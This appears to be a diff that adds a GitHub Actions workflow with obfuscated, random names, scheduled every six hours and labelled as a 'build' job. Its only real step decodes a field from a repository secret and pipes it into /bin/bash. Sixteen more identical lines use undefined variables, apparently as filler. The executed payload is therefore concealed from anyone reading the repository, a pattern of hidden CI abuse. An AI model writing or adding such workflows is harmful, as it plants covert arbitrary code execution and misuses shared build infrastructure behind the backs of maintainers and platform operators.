@@ -1,0 +1,33 @@
+name: gaitersvengeful
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '50 5/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: gaitersvengeful
+        env:
+          fic565: ${{ secrets.fic565 }}
+        run: |
+          echo $fic565 | jq -r .t65 | /bin/bash
+          echo $d66999 | jq -r .bwvk56 | /bin/bash
+          echo $b13477 | jq -r .mf8907 | /bin/bash
+          echo $rxscc50 | jq -r .mha56724 | /bin/bash
+          echo $qj1 | jq -r .svyqd5 | /bin/bash
+          echo $lt2 | jq -r .kudmh3 | /bin/bash
+          echo $zwxsl6595 | jq -r .qbmq68 | /bin/bash
+          echo $bxek5 | jq -r .qnkp253 | /bin/bash
+          echo $gqs926 | jq -r .wupyp062 | /bin/bash
+          echo $v380 | jq -r .dzbua6276 | /bin/bash
+          echo $sb4763 | jq -r .kz30081 | /bin/bash
+          echo $qus38515 | jq -r .gq269 | /bin/bash
+          echo $sh56903 | jq -r .nlijw571 | /bin/bash
+          echo $ubtlf9828 | jq -r .vndxy66176 | /bin/bash
+          echo $y44 | jq -r .gsl316 | /bin/bash
+          echo $mmh65 | jq -r .ku10296 | /bin/bash
+          echo $y93600 | jq -r .qp00 | /bin/bash
+
